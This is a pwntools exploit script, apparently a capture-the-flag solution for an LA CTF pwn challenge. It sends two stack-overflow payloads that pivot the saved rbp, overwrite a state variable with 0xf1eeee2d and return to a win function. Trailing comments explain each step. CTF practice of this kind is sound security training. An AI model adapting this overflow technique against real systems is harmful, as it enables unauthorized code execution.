from pwn import * 

binary = "./chall"

p = process(binary)

p = remote("chall.lac.tf", 31593)
s = '''
b * vuln+51
b * win
'''

#gdb.attach(p, s)


p.recvuntil(b"Who are you?\n")
payload = flat(
	b'A' * 0x20,
	p64(0x404550), # rbp
	p64(0x00000000004012d0)
)
payload2 = flat(
	b'A'* (0x10 - 1),
	p64(0xf1eeee2d),
	b'B'* 0x10,
	p64(0x00000000004011d6)
)
p.send(payload)
p.send(payload2)
p.interactive()

'''
1. return back to fgets
2. set rbp to 0x404550 (0x10 bytes before state), cuz rbp-20 would be the buffer of fgets later. It loads rbp - 20 i.e. 0x404530 to the buffer
3. 0x10 - 1 bytes padding from 0x404530 to 0x404530(state) (- 1 cuz there's a null byte somehow) 
4. overwrite it with 0xf1eeee2d
5. now starting from 0x28th byte from the fgets buffer, it would be the return address  
'''

